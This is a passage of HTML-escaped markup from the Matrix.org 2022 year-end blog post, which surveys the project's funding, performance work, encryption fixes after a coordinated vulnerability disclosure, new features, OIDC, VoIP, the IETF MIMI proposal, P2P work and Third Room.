&lt;li&gt;Developing integration test suites for Matrix compatibility testing (&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2022&#x2F;12&#x2F;25&#x2F;the-matrix-holiday-update-2022&#x2F;github.com&#x2F;matrix-org&#x2F;sytest&quot;&gt;sytest&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;complement&quot;&gt;complement&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;trafficlight&quot;&gt;trafficlight&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Developing a reference push notification server (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;sygnal&quot;&gt;sygnal&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Developing a reference identity directory server (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;sydent&quot;&gt;sydent&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Procuring and publishing independent &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2022&#x2F;05&#x2F;16&#x2F;independent-public-audit-of-vodozemac-a-native-rust-reference-implementation-of-matrix-end-to-end-encryption&quot;&gt;public audits&lt;&#x2F;a&gt; of Matrix&#x27;s encryption and wider stack&lt;&#x2F;li&gt;
&lt;li&gt;Publishing the matrix.org website and blog&lt;&#x2F;li&gt;
&lt;li&gt;Publishing the weekly &amp;quot;Matrix Live&amp;quot; video podcast&lt;&#x2F;li&gt;
&lt;li&gt;Publishing the weekly &amp;quot;This Week In Matrix&amp;quot; news letter&lt;&#x2F;li&gt;
&lt;li&gt;Organising regular meetups (e.g. &amp;quot;Open Tech Will Save Us&amp;quot;)&lt;&#x2F;li&gt;
&lt;li&gt;Promoting Matrix at open source conferences&lt;&#x2F;li&gt;
&lt;li&gt;Running the matrix.org homeserver&lt;&#x2F;li&gt;
&lt;li&gt;Moderating the matrix.org project rooms&lt;&#x2F;li&gt;
&lt;li&gt;Running free public bridges to networks such as IRC networks and XMPP.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;This list is not remotely exhaustive (turns out there are over 240 projects in the matrix.org GitHub org!) but it serves to illustrate the sheer scale of work that the Foundation performs today.  Keeping the core team funded to work on Matrix as our day job is critical for Matrix’s long-term success, and so we &lt;strong&gt;really&lt;&#x2F;strong&gt; hope that organisations depending on Matrix (or passing philanthropists who appreciate Matrix’s value) will drop a line to &lt;a href=&quot;mailto:funding@matrix.org&quot;&gt;funding@matrix.org&lt;&#x2F;a&gt; and help keep the show on the road.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;turbocharging-matrix&quot;&gt;Turbocharging Matrix&lt;&#x2F;h3&gt;
&lt;p&gt;Aside from the nightmares of funding open source software, 2022 has very much been a year of building - focusing on implementing a step change in Matrix’s performance and usability: ensuring that the protocol can punch its weight (and more!) against centralised proprietary alternatives. After all, Matrix clients need to be at least as good as the centralised alternatives in order to get widespread uptake.&lt;&#x2F;p&gt;
&lt;p&gt;This work has ended up taking many forms: on the server-side, Synapse sprouted Rust support to accelerate its hot paths, starting with &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;13838&quot;&gt;push rule evaluation&lt;&#x2F;a&gt;. It’s super exciting to see Synapse performance heading into a new era, building on the foundations of what’s become a very mature and stable homeserver implementation.&lt;&#x2F;p&gt;
&lt;p&gt;Meanwhile work is in the final stages on “&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-spec-proposals&#x2F;blob&#x2F;rav&#x2F;proposal&#x2F;faster_joins&#x2F;proposals&#x2F;3902-faster-remote-joins.md&quot;&gt;Faster Joins&lt;&#x2F;a&gt;”, finally letting servers rapidly join rooms over federation by synchronising only the minimal subset of state needed to join, rather than proactively synchronising the room’s full current state.  Faster joins became &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2022&#x2F;10&#x2F;18&#x2F;testing-faster-remote-room-joins&quot;&gt;available for testing&lt;&#x2F;a&gt; in Synapse in October, and since then the team has been &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;milestone&#x2F;10&quot;&gt;working through&lt;&#x2F;a&gt; making it support workers and addressing the various edge cases and bugs that have shown up during testing.  Current join performance is a roughly 25x speedup on large rooms, although we’re confident that we can improve this even more, and we’re aiming to land it in time for FOSDEM at the beginning of Feb.&lt;&#x2F;p&gt;
&lt;p&gt;On the client-side, the work to transform Matrix client performance has centred around “&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-spec-proposals&#x2F;blob&#x2F;kegan&#x2F;sync-v3&#x2F;proposals&#x2F;3575-sync.md&quot;&gt;Sliding Sync&lt;&#x2F;a&gt;” - our entirely new API for synchronising the minimal data to a client needed for it to render its UI, thus making login, launch and sync instant.  Sliding sync (originally called “sync v3”) has been a long time in the making; the API has gone through countless iterations as we worked away throughout 2022 implementing it in real-life clients, and adding all the extensions (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-spec-proposals&#x2F;pull&#x2F;3884&quot;&gt;MSC3884&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-spec-proposals&#x2F;pull&#x2F;3885&quot;&gt;MSC3885&lt;&#x2F;a&gt;) needed to get to parity with sync v2.  The wait has been well worth it, though: &lt;a href=&quot;https:&#x2F;&#x2F;pr9256--matrix-react-sdk.netlify.app&#x2F;&quot;&gt;support&lt;&#x2F;a&gt; in Element Web is in the final stages of development - and moreover the next-generation Element X mobile clients will only speak Sliding Sync.&lt;&#x2F;p&gt;
&lt;p&gt;Element X itself is shaping up to be a showcase of just how snappy and performant Matrix can be: built on matrix-rust-sdk, it uses native Swift UI on iOS&#x2F;macOS and Jetpack Compose on Android to couple together the best possible platform-native user experience with the ultimate underlying native-code SDK implementation, backed by sliding sync. The goal is to be at least as snappy as Telegram, iMessage or WhatsApp (we’ve taken to counting the frames in screen recordings to compare things like time-to-launch and time-to-load scrollback).  Element X is currently in late alpha on iOS, and the hope is to enter public beta in time for FOSDEM.  You can see a sneak peek here of the iPad-style layout (running under macOS) though!&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;2022-12-25-elementx.png&quot; alt=&quot;Element X&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Finally, in terms of usability, there have been leaps and bounds forwards across Matrix - particularly with Element’s mobile UI being &lt;a href=&quot;https:&#x2F;&#x2F;element.io&#x2F;blog&#x2F;an-unrecognisable-improvement-elements-new-design-is-here&#x2F;&quot;&gt;entirely refreshed&lt;&#x2F;a&gt; by the design team in September as a stepping stone to the forthcoming final Element X design.  Any remaining UX quirks should be flushed out with Element X, but the visuals are already a clear step forwards towards an excellent alternative to the centralised encumbents.&lt;&#x2F;p&gt;
&lt;iframe src=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;embed&#x2F;kjZCD14qMK0&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen&gt;&lt;&#x2F;iframe&gt;
&lt;h3 id=&quot;encryption&quot;&gt;Encryption&lt;&#x2F;h3&gt;
&lt;p&gt;We had great plans for E2EE in Matrix this year; starting off in a huge rush to get &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;vodozemac&quot;&gt;vodozemac&lt;&#x2F;a&gt; finished and &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2022&#x2F;05&#x2F;16&#x2F;independent-public-audit-of-vodozemac-a-native-rust-reference-implementation-of-matrix-end-to-end-encryption&quot;&gt;audited&lt;&#x2F;a&gt; as our shiny new native-Rust implementation of Olm&#x2F;Megolm. The plan was then to integrate vodozemac into matrix-rust-sdk’s crypto crate, and then replace the various old fragmented E2EE implementations across matrix-js-sdk, matrix-ios-sdk, matrix-android-sdk2 and matrix-rust-sdk itself with One True audited implementation - with audits booked with Least Authority to get further assurance around matrix-rust-sdk-crypto, matrix-rust-sdk itself and finally the full stack (Element X + Synapse).&lt;&#x2F;p&gt;
&lt;p&gt;Unfortunately, things went sideways when security researchers from Royal Holloway University London &amp;amp; elsewhere got in touch to explain that they had found some &lt;a href=&quot;https:&#x2F;&#x2F;nebuchadnezzar-megolm.github.io&#x2F;&quot;&gt;nasty implementation vulnerabilities&lt;&#x2F;a&gt; in the venerable matrix-js-sdk implementation.  So, we had no choice but to pause “Element R” - the project to converge matrix-{js,ios,android}-sdk on matrix-rust-sdk-crypto, and instead start analysing and addressing the issues across all current shipping Matrix clients in order to resolve them as rapidly as possible.  Ironically, it turned out in the end that only matrix-{js,ios,android}-sdk were affected - all other independent implementations, including matrix-rust-sdk, were okay.  As such, the Element R work would have protected us from these vulnerabilities had it been ready, and failing that it would have let us solve them in a single place.  Instead, Element R ended up getting pushed back for months while we worked through the various issues in triplicate across the legacy SDKs, while also checking all the other client implementations we could find, and dealing with additional issues which the RHUL researchers discovered as they dug deeper.  Eventually we finished the analysis and agreed a &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2022&#x2F;09&#x2F;28&#x2F;upgrade-now-to-address-encryption-vulns-in-matrix-sdks-and-clients&quot;&gt;coordinated disclosure&lt;&#x2F;a&gt; at the end of September.
(EDIT: to be clear, we are very grateful to the security researchers for discovering and disclosing the vulns responsibly to us. The frustration here stems from the irony that if we&#x27;d finished the matrix-rust-sdk-crypto rewrite a few months earlier, we&#x27;d have mitigated the severe vulns - but instead, the rewrite got pushed back even further. It&#x27;s obviously our fault though, not the researchers&#x27;.)&lt;&#x2F;p&gt;
&lt;p&gt;Since then, work has been split three ways: firstly, Element R work has resumed - and in fact Element R on iOS is pretty much usable as of today, other than needing some work to support E2EE push notifications (which will also be required for Element X). Element R on Android is very close too, and meanwhile Element R on Web decrypted its first event on Dec 19th! We’re hoping to get Element R in production on all platforms by Feb.&lt;&#x2F;p&gt;
&lt;p&gt;Secondly, we’ve been addressing other points raised by the RHUL researchers to ensure that malicious servers cannot add malicious devices or users to conversations, rather than warning as we do today.  This is not a trivial problem to solve, but we’re making progress via &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-spec-proposals&#x2F;pull&#x2F;3917&quot;&gt;MSC3917&lt;&#x2F;a&gt; (Cryptographically Constrained Room Membership) and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-spec-proposals&#x2F;pull&#x2F;3834&quot;&gt;MSC3834&lt;&#x2F;a&gt; (Opportunistic user key pinning (TOFU)).  However, this work is effectively blocked on Element R landing first, as there’s no way we’re going to fix this in triplicate on the legacy SDKs.&lt;&#x2F;p&gt;
&lt;p&gt;Thirdly, we’ve been pushing ahead on implementing Decentralised MLS as a next-generation encryption protocol for Matrix to potentially replace Olm and Megolm.  This work was badly disrupted by RHUL mitigations, but we’re making good progress again - you can follow all the details over at &lt;a href=&quot;https:&#x2F;&#x2F;arewemlsyet.com&quot;&gt;https:&#x2F;&#x2F;arewemlsyet.com&lt;&#x2F;a&gt;.  Matrix over DMLS is currently in alpha, but the aim is to start beta testing Decentralised MLS in 2023.&lt;&#x2F;p&gt;
&lt;p&gt;Finally, we’ve been working hard on completely reworking the overall UX of how E2EE should work in Matrix clients - specifically, requiring users to cross-sign their devices in order to use E2EE, and so end up in a much higher trust world (alongside Trust On First Use). Can’t wait to finally simplify the E2EE UX!&lt;&#x2F;p&gt;
&lt;h3 id=&quot;all-new-features&quot;&gt;All new features&lt;&#x2F;h3&gt;
&lt;p&gt;It’s not all been performance and stability work this year - there have been some large areas of feature work happening too.&lt;&#x2F;p&gt;
&lt;p&gt;One of the most visible projects has been Threads, which &lt;a href=&quot;https:&#x2F;&#x2F;element.io&#x2F;blog&#x2F;introducing-threads-in-beta&#x2F;&quot;&gt;launched in beta&lt;&#x2F;a&gt; in April, and subsequently has undergone huge amounts of polish to improve performance, notification semantics, unread behaviour and thread-aware read receipts.  The end result is feeling great now, and threads &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;element_hq&#x2F;status&#x2F;1605861000296640512&quot;&gt;exited beta&lt;&#x2F;a&gt; in Element Mobile on Dec 20th. Web narrowly missed the window due to a final ‘stuck notification’ bug which is still being tracked down, but will follow shortly afterwards and then threads will be finally out of beta!&lt;&#x2F;p&gt;
&lt;p&gt;Another big project in 2022 has been to create a general purpose Rich Text Editor to provide WYSIWYG (What You See Is What You Get) message composition for Matrix clients.  This has ended up being a very ambitious project to define all the core editing semantics in a shared rust library, with platform-specific bindings to link it into the editing UI available on Web, iOS &amp;amp; Android.  The end result lives at &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-rich-text-editor&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-rich-text-editor&lt;&#x2F;a&gt; - and you can play with it by enabling it in labs on Element Web&#x2F;iOS&#x2F;Android or experiment with the &lt;a href=&quot;https:&#x2F;&#x2F;matrix-org.github.io&#x2F;matrix-rich-text-editor&quot;&gt;live demo&lt;&#x2F;a&gt;. The core behaviour is feeling excellent, although predictably some of the fine detail is very fiddly to get right. It’s almost there, though, and thanks to its built-in rust test harness generator(!) we are confident we’ll catch and control all the edge cases, and this should form an incredibly strong platform for all future rich text editing requirements in Matrix (and beyond!).  This work was very kindly sponsored by one of Element’s public sector customers in order to get Element to parity with Teams - thank you!&lt;&#x2F;p&gt;
&lt;p&gt;Location Sharing was another feature which landed in 2022 - powered by &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-spec-proposals&#x2F;pull&#x2F;3488&quot;&gt;MSC3488&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-spec-proposals&#x2F;pull&#x2F;3489&quot;&gt;MSC3489&lt;&#x2F;a&gt;, and implemented in matrix-{js,ios,android}-sdk in Element Web&#x2F;iOS&#x2F;Android, letting users share static and live locations and view them on an OpenStreetMap compatible map tileserver of their server’s choice. The Live Location Sharing is controversial in that it stores location data in the room history (and as such is hidden behind a labs flag on Element), but should eventually be replaced by &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-spec-proposals&#x2F;pull&#x2F;3672&quot;&gt;MSC3672&lt;&#x2F;a&gt; to share locations are custom ephemeral events instead (once custom EDUs land) in the spec.  Around the same time, Polls also went live thanks to &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-spec-proposals&#x2F;pull&#x2F;3381&quot;&gt;MSC3381&lt;&#x2F;a&gt; - it’s worth noting that both Location Sharing and Polls are excellent examples of “extensible events” in the wild: ensuring that clients which understand the custom event type will render them appropriately, but letting other clients fall back to showing them as simple timeline events.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;open-id-connect&quot;&gt;Open ID Connect&lt;&#x2F;h3&gt;
&lt;p&gt;The transition to using Open ID Connect for Matrix authentication has been progressing steadily throughout 2022 - with Third Room being the first OIDC-native Matrix client, closely followed by Element X. &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-authentication-service&quot;&gt;matrix-authentication-service&lt;&#x2F;a&gt; now exists as a basic OIDC identity provider suitable for being linked into Synapse, and meanwhile Third Room demonstrates how you can integrate Keycloak as a third party IDP (complete with reCAPTCHA and guest access!).  The team also went on a very exciting detour to figure out how to perform login-and-E2EE-setup in a single operation by scanning a QR code (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-spec-proposals&#x2F;pull&#x2F;3906&quot;&gt;MSC3906&lt;&#x2F;a&gt;), and how it might integrate into OIDC in future.&lt;&#x2F;p&gt;
&lt;p&gt;Element X looks set to be the showcase for native OIDC in a typical Matrix client going forwards, so watch this space to see how it feels!&lt;&#x2F;p&gt;
&lt;p&gt;You can keep track of the inexorable transition to OIDC over at &lt;a href=&quot;https:&#x2F;&#x2F;areweoidcyet.com&quot;&gt;https:&#x2F;&#x2F;areweoidcyet.com&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;voip&quot;&gt;VoIP&lt;&#x2F;h3&gt;
&lt;p&gt;2022 was the year that Matrix finally got native multiparty VoIP.  After launching &lt;a href=&quot;https:&#x2F;&#x2F;element.io&#x2F;blog&#x2F;introducing-native-matrix-voip-with-element-call&#x2F;&quot;&gt;Element Call Beta 1&lt;&#x2F;a&gt; in March followed by &lt;a href=&quot;https:&#x2F;&#x2F;element.io&#x2F;blog&#x2F;element-call-beta-2-encryption-spatial-audio-walkie-talkie-mode-and-more&#x2F;&quot;&gt;Beta 2&lt;&#x2F;a&gt; in June, we’ve been busy embedding Element Call as a “matryoshka” widget into Element Web, using it to replace Jitsi in powering video rooms and video calls.  You can read all about this in detail in the &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2022&#x2F;08&#x2F;15&#x2F;the-matrix-summer-special-2022#native-voip-conferencing&quot;&gt;summer blog post&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Meanwhile, lots of progress is underway on &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;waterfall&quot;&gt;Waterfall&lt;&#x2F;a&gt; - the name we picked for the Pion-based decentralised Selective Forwarding Unit (i.e. conferencing focus) contributed by Sean DuBois earlier in the year, including adding simulcast support to support large scale conferences.&lt;&#x2F;p&gt;
&lt;p&gt;There’s only one catch, which is that Element Call is still in (very very late) beta, thanks to a handful of bugs which have been hard to track down, which has in turn kept all the other dependencies (embedded Element Call; video rooms etc) in beta too.  However, we think we’re pretty much there now - which is perfect timing given how Waterfall is coming together, meaning that both stable &lt;em&gt;and&lt;&#x2F;em&gt; scalable native Matrix conferences are on the horizon!&lt;&#x2F;p&gt;
&lt;p&gt;Even better, the plan is for Element X to rely entirely on embedding Element Call for VoIP - so we should be able to jump forwards pretty rapidly to having excellent native multiparty VoIP and video rooms on mobile as well as on Web.  So, once Element Call exits beta, everything should follow.  Just for a change, we’re aiming to get this done by the end of January - but there are a lot of unknown unknowns still flying around, so watch this space…&lt;&#x2F;p&gt;
&lt;h3 id=&quot;ietf-mimi&quot;&gt;IETF &amp;amp; MIMI&lt;&#x2F;h3&gt;
&lt;p&gt;Another massive new initiative this year has been the process of proposing Matrix to the IETF as a candidate for use in interoperable instant messaging standardisation.  The &lt;a href=&quot;https:&#x2F;&#x2F;datatracker.ietf.org&#x2F;group&#x2F;mimi&#x2F;about&#x2F;&quot;&gt;MIMI (More Instant Messaging Interoperability) working group&lt;&#x2F;a&gt; emerged earlier in the year within IETF as an initiative to define how MLS could be used to interoperate between different instant messaging silos - as shortly to be required by the &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2022&#x2F;03&#x2F;29&#x2F;how-do-you-implement-interoperability-in-a-dma-world&quot;&gt;Digital Markets Act&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;One of the things that MIMI aims to do is to define a common application layer protocol to exchange messages. At first &lt;a href=&quot;https:&#x2F;&#x2F;datatracker.ietf.org&#x2F;doc&#x2F;draft-mahy-mimi-content&#x2F;01&#x2F;&quot;&gt;CPIM was proposed&lt;&#x2F;a&gt; (an ancient message format that looks a lot like email) - and then an &lt;a href=&quot;https:&#x2F;&#x2F;datatracker.ietf.org&#x2F;doc&#x2F;draft-rosenberg-mimi-msg-format&#x2F;&quot;&gt;entirely new JSON message format&lt;&#x2F;a&gt; proposal emerged which looks somewhat Matrix (but isn’t). At this point it became obvious that we should throw our hat into the ring and encourage MIMI to use Matrix rather than reinvent it, and so we set about proposing Matrix as at least the &lt;a href=&quot;https:&#x2F;&#x2F;datatracker.ietf.org&#x2F;doc&#x2F;draft-ralston-mimi-matrix-message-format&#x2F;&quot;&gt;message format&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;datatracker.ietf.org&#x2F;doc&#x2F;draft-ralston-mimi-matrix-transport&#x2F;&quot;&gt;message transport layer&lt;&#x2F;a&gt; of the stack. It’s quite surreal to see Matrix starting to fly around as IETF Drafts!&lt;&#x2F;p&gt;
&lt;p&gt;The next step here is to re-express the relevant bits of the current Matrix spec as self-contained IETF Drafts (rather than backreferencing the current spec from the drafts).  The idea is that the normal Matrix spec will continue to evolve much as it always has, but we’ll effectively donate a Long Term Supported dialect of it to IETF which can then evolve according to IETF process and be immortalise as RFCs for use in MIMI.  We’ll then backport those changes into spec.matrix.org in order to avoid fragmentation, while retaining the same ability we have to rapidly iterate and extend Matrix with MSCs.  This work is well under way (taking opportunity to use &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-spec-proposals&#x2F;blob&#x2F;matthew&#x2F;msc1767&#x2F;proposals&#x2F;1767-extensible-events.md&quot;&gt;Extensible Events&lt;&#x2F;a&gt; from the outset!), and we should see explosions of further IETF Drafts emanating from Travis as 2023 progresses.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;trust-safety&quot;&gt;Trust &amp;amp; Safety&lt;&#x2F;h3&gt;
&lt;p&gt;2022 saw a real uptick in spam and abuse across Matrix, and there have been some valiant attempts to improve our moderation tooling over the course of the year.  Unfortunately it hasn’t come together as rapidly as we might have hoped, however, and we’ve seen several large communities give up on Matrix and move back to Discord thanks in part to needing better anti-abuse mechanisms.&lt;&#x2F;p&gt;
&lt;p&gt;In 2023 we’re resetting our trust &amp;amp; safety work, with Mjolnir dev returning to its original development team, and we’ll be working as tactically as possible to ensure that all communities on Matrix can easily block abuse using whatever mechanisms they need.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;p2p-dendrite&quot;&gt;P2P &amp;amp; Dendrite&lt;&#x2F;h3&gt;
&lt;p&gt;Meanwhile, Dendrite (our second generation homeserver implementation) development has continued at pace throughout the year. According to sytest we are now at 93% client-server API compliance with 577 out of 620 tests passing, and the server-server API compliance is at 97% with 111 out of 114 tests passing! None of the missing tests are showstoppers, so it’s fair to say that Dendrite is very nearly ready for primetime.&lt;&#x2F;p&gt;
&lt;p&gt;The interesting plot twist is that Dendrite development has ended up increasingly focusing on embedded matrix server use cases - particularly to power Peer-to-Peer Matrix, where clients require a server to be embedded within them.  So while Synapse has ended up increasingly focusing on large-scale deployments, Dendrite has ended up pursuing smaller instances (which is ironic, given originally it was meant to be the other way round!).&lt;&#x2F;p&gt;
&lt;p&gt;P2P Matrix work has been progressing well too - you can follow the blow-by-blow updates over at &lt;a href=&quot;https:&#x2F;&#x2F;arewep2pyet.com&quot;&gt;https:&#x2F;&#x2F;arewep2pyet.com&lt;&#x2F;a&gt;. After a lot of back and forth evaluating hard-state routing versus soft-state routing in Pinecone, we’ve ended up converging on soft-state routing (which is chattier, but easier to reason about in terms of mitigating attacks). However, the chattiness means that it doesn’t scale as well as one might hope - so we’re now working on a “tiered” approach where separate Pinecone networks can be tiered together into one inter-network, giving us scalability at the expense of being slightly less decentralised. It’s fair to say that the journey here has been pretty frustrating in its twists and turns, and sadly Neil Alexander chose to move on a few months ago. However, Devon has stepped up to fill his shoes as primary Pinecone and P2P wrangler, and is making amazing progress on the remaining work - firstly implementing &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;dendrite&#x2F;pull&#x2F;2917&quot;&gt;Store and Forward relaying&lt;&#x2F;a&gt; in Dendrite so that today’s Pinecone networks can exchange messages even if the recipient node is offline.  Next up will be bridging P2P Matrix with today’s Matrix network - and then working on tiering to provide the scalability we need.  The expectation is that today’s serverside Dendrite instances will effectively turn into static pinecone peers, store and forwarding messages on behalf of P2P nodes, and providing tiering between respective pinecone subnets.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;hydrogen-chatterbox&quot;&gt;Hydrogen &amp;amp; Chatterbox&lt;&#x2F;h3&gt;
&lt;p&gt;Development on Hydrogen as a super-lightweight progressive-web-app Matrix client has also been progressing throughout the year (with a few detours to help out with end-to-end testing via &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;trafficlight&quot;&gt;trafficlight&lt;&#x2F;a&gt; both for the benefit of Hydrogen and other clients).&lt;&#x2F;p&gt;
&lt;p&gt;The biggest change has been Hydrogen sprouting a separate SDK layer, letting the engine be embedded into other webapps in order to add noninvasive Matrix messaging with as minimal a footprint as possible.  This was showcased in Element’s &lt;a href=&quot;https:&#x2F;&#x2F;element.io&#x2F;blog&#x2F;element-launches-chatterbox&#x2F;&quot;&gt;chatterbox&lt;&#x2F;a&gt; offering in July - providing an open source chatbox which can be trivially embedded into existing sites, and also powers the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Automattic&#x2F;chatrix&quot;&gt;Chatrix&lt;&#x2F;a&gt; wordpress plugin that Automattic is working on.&lt;&#x2F;p&gt;
&lt;p&gt;Hydrogen also added independent support for &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-spec-proposals&#x2F;pull&#x2F;3401&quot;&gt;MSC3401&lt;&#x2F;a&gt; multiparty voice&#x2F;video calling (albeit on a &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;hydrogen-web&#x2F;pull&#x2F;705&quot;&gt;branch&lt;&#x2F;a&gt;), letting us showcase heterogeneous Element Call &amp;lt;-&amp;gt; Hydrogen group calling and prove MSC3401 as fit for purpose as a true open interoperable call signalling - and in turn Hydrogen SDK, complete with the multiparty voice&#x2F;video calling, powers the Matrix engine within Third Room - our metaverse-on-Matrix platform.&lt;&#x2F;p&gt;
&lt;p&gt;We’re looking forwards to Hydrogen continuing to reach full feature parity with Element over the next year, and popping up in increasingly unexpected places as everyone’s favourite embedded Matrix client!&lt;&#x2F;p&gt;
&lt;h3 id=&quot;third-room&quot;&gt;Third Room&lt;&#x2F;h3&gt;
&lt;p&gt;Finally, it’s hard to believe that &lt;a href=&quot;https:&#x2F;&#x2F;thirdroom.io&quot;&gt;Third Room&lt;&#x2F;a&gt;, our Matrix-based open platform for decentralised realtime spatial collaboration, barely existed at the beginning of the year.  Third Room serves to demonstrate that Matrix is &lt;em&gt;way&lt;&#x2F;em&gt; more than just chat and VoIP, but can power the spatial communication layer of the open web. This has ended up driving forwards a tonne of new capabilities for Matrix - showcasing native OIDC auth; scalable multiparty VoIP in Hydrogen SDK, efficient binary-diffed file storage, and more recently has been defining how to store extensible behaviour for Matrix rooms as WASM objects stored in the Matrix room itself.&lt;&#x2F;p&gt;
&lt;p&gt;Third Room itself is a Hydrogen-based Matrix client, which lets you view Matrix rooms as interactive multiparty 3D environments (using &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-spec-proposals&#x2F;pull&#x2F;3815&quot;&gt;MSC3815&lt;&#x2F;a&gt;) - with the world defined as glTF blobs stored in the Matrix room, and the ability to script and customise any aspect of that world using WASM blobs stored in Matrix rooms, which execute on the participating clients, exposing a new scenegraph API called WebSceneGraph in order to manipulate the glTF that makes up the world.  We also expect to see a variant of Matrix’s normal widget API to be exposed to these WASM blobs, introducing the concept of sandboxed clientside widgets, bots or other integrations - letting users customise and extend Matrix without ever having to run serverside bots again.&lt;&#x2F;p&gt;
&lt;p&gt;The intention is to provide a platform which can be used to build &lt;em&gt;any&lt;&#x2F;em&gt; kind of interactive realtime spatial multiparty app in an open standardised, decentralised, end-to-end encrypted way - whether that’s for gaming, social, or professional activity such as building “digital twins” for manufacturing, agriculture, smart cities, search &amp;amp; rescue, etc.  You can read more about the vision at &lt;a href=&quot;https:&#x2F;&#x2F;thirdroom.io&#x2F;preview&quot;&gt;thirdroom.io&#x2F;preview&lt;&#x2F;a&gt;, or via press coverage at &lt;a href=&quot;https:&#x2F;&#x2F;thenewstack.io&#x2F;third-room-teases-user-generated-content-for-the-metaverse&#x2F;&quot;&gt;TheNewStack&lt;&#x2F;a&gt; or &lt;a href=&quot;https:&#x2F;&#x2F;www.golem.de&#x2F;news&#x2F;third-room-das-open-source-metaverse-von-matrix-2212-170638.html&quot;&gt;Golem&lt;&#x2F;a&gt;.  We were also incredibly flattered to be invited to present Third Room at &lt;a href=&quot;https:&#x2F;&#x2F;sa2022.siggraph.org&#x2F;en&#x2F;presentation&#x2F;?id=realcur_102&amp;amp;sess=sess143&quot;&gt;SIGGRAPH Asia&lt;&#x2F;a&gt; a few weeks ago.  The official recording has yet to emerge, but you can find a &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;o_ob&#x2F;status&#x2F;1601442998696677376&quot;&gt;cheeky bootleg here&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
